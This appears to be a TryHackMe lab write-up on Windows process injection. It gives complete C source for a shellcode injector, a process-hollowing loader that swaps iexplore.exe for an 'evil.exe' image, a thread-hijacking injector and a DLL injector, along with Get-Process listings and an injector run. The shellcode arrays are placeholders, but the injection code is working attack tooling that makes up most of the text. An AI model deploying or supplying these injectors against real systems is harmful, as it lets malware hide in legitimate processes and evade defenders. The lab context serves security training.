
# Task 1: Abusing Processes

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt3.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt4.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt5.png)


```C
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "3484";

int main(int argc, char *argv[]) {
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)b_shellcode, NULL, 0, NULL);
}
```
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    138       9    14984      14532              2784   0 amazon-ssm-agent
    238      15     5240      18740       0.08   5024   2 ApplicationFrameHost
     83       5      848       3784              3268   0 CompatTelRunner
    151       9     6612      12504              2680   0 conhost
    151       9     6600      12508              3548   0 conhost
    255      13     4648      17904       0.30   3864   2 conhost
    353      13     2168       5168               564   0 csrss
    161       9     1664       4756               632   1 csrss
    318      13     2208       5388               840   2 csrss
    371      15     3624      15364       0.41   3360   2 ctfmon
    233      16     3440      13232       0.17   4888   2 dllhost
    541      22    16308      38644               504   1 dwm
    618      31    16236      43736               556   2 dwm
   1762      71    31772      97144       3.50   4908   2 explorer
     49       7     2008       5968               492   2 fontdrvhost
     49       6     1424       3732               900   0 fontdrvhost
     49       6     1636       4272               908   1 fontdrvhost
    196      11     1748        100              4060   0 GoogleCrashHandler
    173       9     1832          8              3236   0 GoogleCrashHandler64
    236      14     2352        168              3280   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1176       5080              2060   0 LiteAgent
    459      25    10972      43388              2400   1 LogonUI
   1049      22     5128      15180               776   0 lsass
    222      13     2904      10140              3036   0 msdtc
    531      70   179612     106668               804   0 MsMpEng
    260      14     2776      17912       0.14   3536   2 notepad
    661      29    63960      74736       1.66   4036   2 powershell
    319      13     2536      11488       0.23   2640   2 rdpclip
      0      13      440      11708                68   0 Registry
    474      23     9192      30256       1.95   2268   2 RuntimeBroker
    207      11     2164      11620       0.06   3844   2 RuntimeBroker
    265      14     3448      18584       0.09   3928   2 RuntimeBroker
   1146      74    82960     152664       1.88   4440   2 SearchUI
    312      11     3388       7676               764   0 services
    714      29    15092      52348       0.36   3632   2 ShellExperienceHost
    468      17     5060      25172       1.03   3088   2 sihost
    315      20     7752      22936       0.22   4232   2 smartscreen
     56       3      532       1240               412   0 smss
    481      23     5864      16608              2040   0 spoolsv
    157      10    15008      17244              2128   0 ssm-agent-worker
   1830     100    42328      75228               628   0 svchost
    848      27    26792      39508               844   0 svchost
    870      23     7352      24488               880   0 svchost
    747      17     5124      11460               972   0 svchost
    719      34    13168      24696               988   0 svchost
    631      20    17212      28644              1152   0 svchost
    623      31     8832      25108              1196   0 svchost
    693      38     8160      22560              1260   0 svchost
    313      11     2072       8964              1268   0 svchost
    371      16    11724      12768              1276   0 svchost
    201      10     4160      13216              1444   0 svchost
    398      32     8864      17756              1460   0 svchost
    200      11     1564       7176              1624   0 svchost
    223      10     1920       7464              1720   0 svchost
    203      10     2064       8196              2160   0 svchost
    462      20     6628      29948       0.44   3176   2 svchost
    145       8     1500       7272              3348   0 svchost
    185      11     3912      11768              4792   0 svchost
    386      16     5488      15508              2140   0 Sysmon
   2008       0      192        156                 4   0 System
    313      13     4300      17728       0.11   2800   2 taskhostw
    243      24     4932      14616       0.19   3200   2 taskhostw
    126       7     1288       6620              3068   0 unsecapp
    179      11     1572       6896               652   0 wininit
    250      12     2616      15364               724   1 winlogon
    290      12     2660       9896              1336   2 winlogon
    194      12     3080       9432              2412   0 WmiPrvSE
```

```PowerShell
PS C:\Users\THM-Attacker> cd .\Desktop\Injectors\
```
```PowerShell
PS C:\Users\THM-Attacker\Desktop\Injectors> .\shellcode-injector.exe 4968
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt6.png)


# Task 2: Expanding Process Abuse


```C
#include <stdio.h>
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

int main() {

	LPSTARTUPINFOA pVictimStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();

	// Tested against 32-bit IE.
	LPCSTR victimImage = "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe";

	// Change this. Also must be 32-bit. Use project settings from the same project.
	LPCSTR replacementImage = "C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe";

	// Create victim process
	if (!CreateProcessA(
			0,
			(LPSTR)victimImage,
			0,
			0,
			0,
			CREATE_SUSPENDED,
			0,
			0,
			pVictimStartupInfo,
			pVictimProcessInfo)) {
		printf("[-] Failed to create victim process %i\r\n", GetLastError());
		return 1;
	};

	printf("[+] Created victim process\r\n");
	printf("\t[*] PID %i\r\n", pVictimProcessInfo->dwProcessId);

	
	// Open replacement executable to place inside victim process
	HANDLE hReplacement = CreateFileA(
		replacementImage,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0,
		0
	);

	if (hReplacement == INVALID_HANDLE_VALUE) {
		printf("[-] Unable to open replacement executable %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}

	DWORD replacementSize = GetFileSize(
		hReplacement,
		0);
	printf("[+] Replacement executable opened\r\n");
	printf("\t[*] Size %i bytes\r\n", replacementSize);

	
	// Allocate memory for replacement executable and then load it
	PVOID pReplacementImage = VirtualAlloc(
		0, 
		replacementSize, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE);

	DWORD totalNumberofBytesRead;

	if (!ReadFile(
			hReplacement, 
			pReplacementImage, 
			replacementSize, 
			&totalNumberofBytesRead, 
			0)) {
		printf("[-] Unable to read the replacement executable into an image in memory %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	CloseHandle(hReplacement);
	printf("[+] Read replacement executable into memory\r\n");
	printf("\t[*] In current process at 0x%08x\r\n", (UINT)pReplacementImage);

	
	// Obtain context / register contents of victim process's primary thread
	CONTEXT victimContext;
	victimContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pVictimProcessInfo->hThread, 
		&victimContext);
	printf("[+] Obtained context from victim process's primary thread\r\n");
	printf("\t[*] Victim PEB address / EBX = 0x%08x\r\n", (UINT)victimContext.Ebx);
	printf("\t[*] Victim entry point / EAX = 0x%08x\r\n", (UINT)victimContext.Eax);

	
	// Get base address of the victim executable
	PVOID pVictimImageBaseAddress;
	ReadProcessMemory(
		pVictimProcessInfo->hProcess, 
		(PVOID)(victimContext.Ebx + 8), 
		&pVictimImageBaseAddress, 
		sizeof(PVOID), 
		0);
	printf("[+] Extracted image base address of victim process\r\n");
	printf("\t[*] Address: 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

	
	// Unmap executable image from victim process	
	DWORD dwResult = NtUnmapViewOfSection(
		pVictimProcessInfo->hProcess,
		pVictimImageBaseAddress);
	if (dwResult) {
		printf("[-] Error unmapping section in victim process\r\n");
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}

	printf("[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n");
	printf("\t[*] Utilized base address of 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

	
	// Allocate memory for the replacement image in the remote process
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew);
	DWORD replacementImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
	DWORD sizeOfReplacementImage = pNTHeaders->OptionalHeader.SizeOfImage;

	printf("[+] Replacement image metadata extracted\r\n");
	printf("\t[*] replacementImageBaseAddress = 0x%08x\r\n", (UINT)replacementImageBaseAddress);
	printf("\t[*] Replacement process entry point = 0x%08x\r\n", (UINT)pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	
	PVOID pVictimHollowedAllocation = VirtualAllocEx(
		pVictimProcessInfo->hProcess,
		(PVOID)pVictimImageBaseAddress,
		sizeOfReplacementImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!pVictimHollowedAllocation) {
		printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	printf("[+] Allocated memory in victim process\r\n");
	printf("\t[*] pVictimHollowedAllocation = 0x%08x\r\n", (UINT)pVictimHollowedAllocation);
	
	
	// Write replacement process headers into victim process
	WriteProcessMemory(
		pVictimProcessInfo->hProcess, 
		(PVOID)pVictimImageBaseAddress,
		pReplacementImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		0);
	printf("\t[*] Headers written into victim process\r\n");
	
	// Write replacement process sections into victim process
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = 
			(PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) 
				+ (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(pVictimProcessInfo->hProcess, 
			(PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pReplacementImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData, 
			0);
		printf("\t[*] Section %s written into victim process at 0x%08x\r\n", pSectionHeader->Name, (UINT)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
		printf("\t\t[*] Replacement section header virtual address: 0x%08x\r\n", (UINT)pSectionHeader->VirtualAddress);
		printf("\t\t[*] Replacement section header pointer to raw data: 0x%08x\r\n", (UINT)pSectionHeader->PointerToRawData);
	}
	
	
	// Set victim process entry point to replacement image's entry point - change EAX
	victimContext.Eax = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	SetThreadContext(
		pVictimProcessInfo->hThread, 
		&victimContext);
	printf("[+] Victim process entry point set to replacement image entry point in EAX register\n");
	printf("\t[*] Value is 0x%08x\r\n", (UINT)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

	
	printf("[+] Resuming victim process primary thread...\n");
	ResumeThread(pVictimProcessInfo->hThread);

	printf("[+] Cleaning up\n");
	CloseHandle(pVictimProcessInfo->hThread);
	CloseHandle(pVictimProcessInfo->hProcess);
	VirtualFree(pReplacementImage, 0, MEM_RELEASE);

	return 0;
}
```
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    141      10    13672      13168              1876   0 amazon-ssm-agent
    256      14     4200      18136       0.11   4156   2 backgroundTaskHost
     74       5     2608       4228       0.02   3192   2 cmd
     80       5      852        336              2176   0 CompatTelRunner
    151       9     6592       1636              2232   0 conhost
    155       9     6636      12496              2576   0 conhost
    200      12     7140      15616       0.11   3252   2 conhost
    254      14     4100      17308       0.13   3440   2 conhost
    356      14     2112       5144               560   0 csrss
    161       9     1660       4744               632   1 csrss
    292      13     2104       6708              3200   2 csrss
    373      15     3584      15060       0.06   3492   2 ctfmon
    235      23     5172      14240       0.11   3132   2 dllhost
    541      22    16336      38336               860   1 dwm
    605      28    16136      53264              3332   2 dwm
   1984      75    34904     100400       5.00   3548   2 explorer
     49       6     1428       3724               900   0 fontdrvhost
     49       6     1628       4256               908   1 fontdrvhost
     49       6     1604       4312              3288   2 fontdrvhost
    218      12     1900       1512              2948   0 GoogleCrashHandler
    177      10     1884       1160               796   0 GoogleCrashHandler64
    247      14     2308       8296              1724   0 GoogleUpdate
    324      18     3116       7180              2504   0 GoogleUpdate
    243      14     2500       1584              2996   0 GoogleUpdate
    337      18     3008      13204              5084   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1156       5060              2072   0 LiteAgent
    464      26    11076      43272              2408   1 LogonUI
   1083      22     5152      14584               776   0 lsass
    152       8     2232       7412              3024   0 MpCmdRun
    229      12     2884       9096              3992   0 MpCmdRun
    228      13     2924      10148              1172   0 msdtc
    507      69   172140      95372              2044   0 MsMpEng
    749      36    84180      93320       1.59   3860   2 powershell
    605      30    64152      73772       0.78   4340   2 powershell
    320      13     2480      11148       0.11   3480   2 rdpclip
      0      13     6340      17740                68   0 Registry
    274      14     4828      19092       0.13   4672   2 RuntimeBroker
    507      24    10252      32752       1.69   4900   2 RuntimeBroker
    237      12     2596      13056       0.17   5036   2 RuntimeBroker
   1182      74    86972     160132       3.38   4708   2 SearchUI
    331      11     3368       7668               760   0 services
    765      30    15748      54852       0.33   4516   2 ShellExperienceHost
    498      18     5064      24740       0.69    772   2 sihost
    338      21     7796      22632       0.22   3520   2 smartscreen
     56       3      528       1240               408   0 smss
    484      23     5856      16612              2024   0 spoolsv
    157      11    14804      16908              2608   0 ssm-agent-worker
    862      27    32244      44248               624   0 svchost
   1926     113    42152      77040               636   0 svchost
    574      29    10060      19932               756   0 svchost
    880      23     6904      23808               880   0 svchost
    218      12     4844      13712               888   0 svchost
    838      20     4860      11268               972   0 svchost
    622      20    17404      28640              1164   0 svchost
    595      31     7692      19828              1200   0 svchost
    788      39     8736      22696              1260   0 svchost
    316      12     2276       8884              1268   0 svchost
    369      21    10412      11284              1380   0 svchost
    429      33     9140      17824              1416   0 svchost
    201      11     1692       7004              1576   0 svchost
    215      10     1792       7352              1684   0 svchost
    245      14     2568      10448              1864   0 svchost
    205      10     2064       8124              2140   0 svchost
    183      10     2584       8668              3452   0 svchost
    481      20     6368      30064       0.31   3640   2 svchost
    154       8     1760       7352              3952   0 svchost
    425      16     5548      15520              2128   0 Sysmon
   2220       0      192        152                 4   0 System
    243      20     4016      12624       0.06   3720   2 taskhostw
    126       7     1268       6588              1868   0 unsecapp
    145       7     1276       6292              1060   0 upfc
    181      11     1592       6864               680   0 wininit
    254      12     2764      12268               700   1 winlogon
    295      12     2684       9864              3240   2 winlogon
    203      12     3636       9672              4804   0 WmiPrvSE
```


# Task 3: Abusing Process Components


```C
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_thread;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);

    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(h_snapshot, &threadEntry);

	while (Thread32Next(h_snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == (atoi(argv[1])))
		{
			h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}

    SuspendThread(h_thread);

    GetThreadContext(h_thread, &context);
	context.Rip = (DWORD_PTR)b_shellcode;
	SetThreadContext(h_thread, &context);
	
	ResumeThread(h_thread);

}
```
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    139      10    13868      13312              2420   0 amazon-ssm-agent
    247      14     4076      17360       0.09   2020   3 backgroundTaskHost
     80       5      872        412              2092   0 CompatTelRunner
    151       9     6596       1432              2216   0 conhost
    151       9     6596      12364              2440   0 conhost
    254      14     5860      18724       0.28   3632   3 conhost
    277      12     2112       5248               452   3 csrss
    353      14     1820       4944               564   0 csrss
    161       9     1660       4700               636   1 csrss
    363      15     3548      15040       0.25   3976   3 ctfmon
    257      23     5280      14484       0.08   4748   3 dllhost
    545      22    16236      38328               792   1 dwm
    599      28    14404      41448              3196   3 dwm
   1563      58    25400      81652       3.45   1616   3 explorer
     49       6     1440       3676               908   0 fontdrvhost
     49       6     1636       4208               916   1 fontdrvhost
     49       6     1920       5308              3152   3 fontdrvhost
    220      12     1880       1480              4228   0 GoogleCrashHandler
    175      10     1856       1168              4252   0 GoogleCrashHandler64
    236      14     2360       1616              3880   0 GoogleUpdate
    330      17     2848       4432              4216   0 GoogleUpdate
    237      14     2360       2776              4296   0 GoogleUpdate
    334      18     3240      13624              4816   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1168       4996              2060   0 LiteAgent
    464      25    10980      43168              2500   1 LogonUI
   1030      22     4976      14512               780   0 lsass
    224      13     2996      10144              4480   0 msdtc
    519      70   173372      97836               812   0 MsMpEng
    586      29    63648      73284       1.67   5060   3 powershell
    318      13     2500      11096       0.11   3688   3 rdpclip
      0      13     7304      14096                68   0 Registry
    229      12     2344      12116       0.19   1588   3 RuntimeBroker
    492      25     9804      32208       2.02   3672   3 RuntimeBroker
    241      13     4156      14328       0.05   3720   3 RuntimeBroker
   1140      73    83860     158648       4.22   3416   3 SearchUI
    313      11     3620       7732               768   0 services
    768      30    15708      52320       0.34   2980   3 ShellExperienceHost
    242      12     2212      10128              4788   0 SIHClient
    468      18     4944      24612       0.69   3708   3 sihost
    329      20     7864      22872       0.16   1344   3 smartscreen
     56       3      528       1228               412   0 smss
    481      23     5840      16516              2012   0 spoolsv
    155      10    14908      17056              2456   0 ssm-agent-worker
    856      27    26340      38688               628   0 svchost
   1931     108    44288      80812               640   0 svchost
    868      23     6960      23760               888   0 svchost
    558      28    10092      19956               904   0 svchost
    826      18     4740      10964               980   0 svchost
    624      20    17976      29328              1176   0 svchost
    579      30     7648      19936              1212   0 svchost
    770      39     8656      22660              1268   0 svchost
    315      11     2168       8820              1276   0 svchost
    352      15    10068      11112              1332   0 svchost
    420      33     8908      17700              1420   0 svchost
    213      10     1800       7320              1672   0 svchost
    201      11     1680       6904              1744   0 svchost
    206      10     2140       8100              2176   0 svchost
    195      10     4260      13276              3612   0 svchost
    469      20     6144      29872       0.19   3796   3 svchost
    180      10     2476       8648              4028   0 svchost
    392      16     5608      15500              2160   0 Sysmon
   2041       0      192        156                 4   0 System
    241      20     3936      12584       0.03   3820   3 taskhostw
    126       8     1316       6540              2416   0 unsecapp
    179      11     1596       6824               656   0 wininit
    250      12     2708      15328               704   1 winlogon
    291      12     2688       9864              3100   3 winlogon
    183      10     2324       8552              1396   0 WmiPrvSE
    183      11     2704       8940              4332   0 WmiPrvSE
```


# Task 4: Abusing DLLs

```C
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

int main(int argc, char *argv[]) {

    if (argc != 3) {
        printf("Cannot find require parameters\n");
        printf("Usage: dll-injector.exe <process name> <path to DLL>\n");
        exit(0);
    }

    char dllLibFullPath[256];

    LPCSTR processName = argv[1];
    LPCSTR dllLibName = argv[2];

    DWORD processId = getProcessId(processName);
    if (!processId) {
        exit(1);
    }

    if (!GetFullPathName(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) {
        exit(1);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        exit(1);
    }

    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dllAllocatedMemory == NULL) {
        exit(1);
    }

    if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) {
        exit(1);
    }

    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, 0, NULL);
    if (remoteThreadHandler == NULL) {
        exit(1);
    }

    CloseHandle(hProcess);

    return 0;
}
```
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    140      10    13632      13632              2420   0 amazon-ssm-agent
    246      14     4036      17300       0.08   3476   3 backgroundTaskHost
    254      14     6000      20736       0.14      8   3 conhost
    151       9     6596      12932              2440   0 conhost
    286      12     2124       6108               452   3 csrss
    336      13     1924       5000               564   0 csrss
    161       9     1660       4700               636   1 csrss
    363      15     3556      15188       0.28   3976   3 ctfmon
    247      22     4684      13932       0.09   4748   3 dllhost
    541      22    16204      38376               792   1 dwm
    595      29    24452      61528              3196   3 dwm
   1571      58    25072      86256       5.45   1616   3 explorer
     49       6     1440       4228               908   0 fontdrvhost
     49       6     1636       4700               916   1 fontdrvhost
     49       6     1932       5836              3152   3 fontdrvhost
    196      11     1740       1256              4228   0 GoogleCrashHandler
    173       9     1832        376              4252   0 GoogleCrashHandler64
    236      14     2360       1332              3880   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1168       5016              2060   0 LiteAgent
    460      25    11020      43220              2500   1 LogonUI
   1025      22     5192      14668               780   0 lsass
    222      13     2924      10228              4480   0 msdtc
    513      74   184824     129828               812   0 MsMpEng
    609      30    64016      73660       0.84    572   3 powershell
    316      13     2520      11260       0.16   3688   3 rdpclip
      0      13      516       9872                68   0 Registry
    248      13     2580      13280       0.22   1588   3 RuntimeBroker
    586      28     9420      31848       2.09   3672   3 RuntimeBroker
    235      12     3952      14352       0.05   3720   3 RuntimeBroker
   1160      76    90692     133736       5.55   3416   3 SearchUI
    310      11     3620       7788               768   0 services
    768      30    15708      52336       0.34   2980   3 ShellExperienceHost
    476      18     5048      24784       0.98   3708   3 sihost
    335      21     7320      21336       0.11   4900   3 smartscreen
     56       3      528       1228               412   0 smss
    481      23     5856      16920              2012   0 spoolsv
    155      11    15424      17636              2456   0 ssm-agent-worker
    849      27    30796      43804               628   0 svchost
   1846      99    43784      78172               640   0 svchost
    868      23     7196      24132               888   0 svchost
    622      31    10592      21880               904   0 svchost
    792      19     5096      11280               980   0 svchost
    608      20    16560      26728              1176   0 svchost
    604      31     8720      25324              1212   0 svchost
    693      38     8316      22664              1268   0 svchost
    313      11     2084       8812              1276   0 svchost
    368      16    11348      12780              1332   0 svchost
    404      32     8436      17360              1420   0 svchost
    221      10     1888       7412              1672   0 svchost
    202      11     1632       7128              1744   0 svchost
    203      10     2084       8100              2176   0 svchost
    130       7     1656       6368              3004   0 svchost
    184      10     4204      13176              3612   0 svchost
    455      19     6104      28864       0.22   3796   3 svchost
    293      16     4752      17788              2160   0 Sysmon
   1956       0      192        156                 4   0 System
    241      21     4036      13084       0.03   3820   3 taskhostw
    126       7     1280       6544              2416   0 unsecapp
    179      11     1596       6824               656   0 wininit
    250      12     2632      15700               704   1 winlogon
    291      12     2688      10172              3100   3 winlogon
    174       9     2116       8776               104   0 WmiPrvSE
```

